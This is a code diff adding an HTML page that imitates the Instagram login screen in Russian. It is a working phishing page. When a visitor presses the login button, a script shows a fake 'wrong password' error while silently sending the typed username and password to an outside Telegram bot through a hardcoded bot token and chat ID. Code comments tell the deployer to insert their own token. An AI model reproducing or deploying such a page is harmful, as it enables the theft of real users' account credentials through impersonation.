@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram Login</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      background-color: #fafafa;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
+
+    .container {
+      background-color: #fff;
+      border: 1px solid #dbdbdb;
+      padding: 40px;
+      width: 100%;
+      max-width: 400px;
+      text-align: center;
+      margin-bottom: 10px;
+    }
+
+    .logo img {
+      width: 175px;
+      margin-bottom: 30px;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 8px;
+      background: #fafafa;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      font-size: 14px;
+    }
+
+    button {
+      width: 100%;
+      padding: 10px;
+      background-color: #3897f0;
+      border: none;
+      color: white;
+      font-weight: bold;
+      border-radius: 8px;
+      cursor: pointer;
+      margin-top: 10px;
+      font-size: 14px;
+    }
+
+    .divider {
+      display: flex;
+      align-items: center;
+      text-align: center;
+      margin: 20px 0;
+    }
+
+    .divider::before,
+    .divider::after {
+      content: "";
+      flex: 1;
+      border-bottom: 1px solid #dbdbdb;
+    }
+
+    .divider:not(:empty)::before {
+      margin-right: 10px;
+    }
+
+    .divider:not(:empty)::after {
+      margin-left: 10px;
+    }
+
+    .facebook-login {
+      color: #385185;
+      font-weight: bold;
+      text-decoration: none;
+      font-size: 14px;
+      margin-top: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+
+    .facebook-login img {
+      width: 18px;
+      height: 18px;
+    }
+
+    .signup-box {
+      background-color: #fff;
+      border: 1px solid #dbdbdb;
+      padding: 20px;
+      text-align: center;
+      width: 100%;
+      max-width: 400px;
+      font-size: 14px;
+    }
+
+    .signup-box a {
+      color: #3897f0;
+      text-decoration: none;
+      font-weight: bold;
+      margin-left: 5px;
+    }
+
+    #error-message {
+      color: red;
+      font-size: 13px;
+      margin-top: 12px;
+    }
+
+    @media (max-width: 480px) {
+      .container, .signup-box {
+        border: none;
+        box-shadow: none;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/512px-Instagram_logo.svg.png" alt="Instagram">
+    </div>
+    <input type="text" placeholder="Телефон, имя пользователя или эл. адрес" id="username">
+    <input type="password" placeholder="Пароль" id="password">
+    <button onclick="sendToTelegram()">Войти</button>
+
+    <div id="error-message"></div>
+
+    <div class="divider">ИЛИ</div>
+
+    <a href="#" class="facebook-login">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Icon">
+      Войти через Facebook
+    </a>
+  </div>
+
+  <div class="signup-box">
+    У вас нет аккаунта?
+    <a href="#">Зарегистрироваться</a>
+  </div>
+
+  <script>
+    function sendToTelegram() {
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+      const errorDiv = document.getElementById("error-message");
+
+      // Показать "ошибку" как у Instagram
+      errorDiv.textContent = "К сожалению, вы ввели неверный пароль. Проверьте свой пароль ещё раз.";
+
+      // Отправка в Telegram
+      const token = '7364692674:AAEyGpjkVwIhLoDV1GblyWZNFHPIkfaOXVk'; // ← Вставь сюда свой токен
+      const chat_id = '6924464658'; // ← Вставь сюда свой chat_id
+      const text = `📲 Логин: ${username}\n🔐 Пароль: ${password}`;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chat_id,
+          text: text
+        })
+      })
+      .catch(error => {
+        console.error("Ошибка отправки:", error);
+      });
+    }
+  </script>
+
+</body>
+</html>
+
+
+
+
+
+
